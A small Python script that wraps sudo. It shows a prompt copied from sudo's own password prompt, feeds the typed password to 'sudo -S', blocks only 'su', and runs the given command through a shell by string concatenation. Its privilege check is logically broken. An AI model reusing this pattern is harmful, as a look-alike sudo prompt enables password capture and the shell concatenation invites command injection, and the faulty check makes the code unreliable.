#!/usr/bin/env python
import sys
import getpass
import subprocess
import re

username = getpass.getuser()
prompt = "[sudo] password for {0}: ".format(username)
wrong_password = "Try again [sudo] password for {0}: ".format(username)
command = ' '.join(map(str, sys.argv[1:]))
Flag = False


class Sudo:
    def __init__(self,password=False):
        self.shell = subprocess
        self.password = password
        self.username = getpass.getuser()
        self.notAllow = []
    def Setpasswrod(self,passwrod):
        self.password = passwrod
    def AddNotallow(self,command):
        self.notAllow.append(command)
    def ListNotallow(self):
        return self.notAllow
    def CheckSudo(self):
        check =self.shell.Popen('sudo -S id', shell=True, stdout=self.shell.PIPE, encoding='utf-8')
        if check.communicate():
            check.terminate()
            return True
        return False
    def bypass(self):
        global Flag
        Flag = True
        password = self.password
        data = self.shell.Popen(['sudo', '-S', 'whoami'], stdin=self.shell.PIPE, stdout=self.shell.PIPE,
                        stderr=self.shell.PIPE, encoding='utf-8').communicate(input=password + '\n')
        # print(command,Ver,data)
        if re.search('root', data[0]):
            return True
        return False

    def runcomd(self,command):
        self.shell.call('sudo -S ' + command, shell=True)



def Main():
    sudo = Sudo()
    sudo.AddNotallow('su')
    Verify = sudo.CheckSudo()
    if command in sudo.ListNotallow():
        print(f'{username} you not allow run this command')
        sys.exit()
    if not Verify and not Flag:
        password = getpass.getpass(prompt)
        sudo.Setpasswrod(password)
        sudo.bypass()
        if sudo.CheckSudo():
            sudo.runcomd(command)
    else:
        sudo.runcomd(command)


if __name__ == '__main__':
    try:
        Main()
    except KeyboardInterrupt:
        sys.exit()
